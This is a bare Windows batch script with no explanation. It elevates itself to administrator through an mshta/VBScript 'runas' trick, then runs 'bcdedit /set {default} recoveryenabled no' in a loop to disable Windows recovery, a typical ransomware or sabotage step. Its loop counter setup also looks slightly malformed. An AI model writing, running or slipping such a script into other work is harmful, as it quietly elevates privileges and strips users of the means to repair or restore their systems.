%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
cd /d "%~dp0"
set count==0
goto loop
:loop
if %count%==5 goto end
set /A count=count+1
bcdedit /set {default} recoveryenabled no
timeout 1
goto loop
:end
exit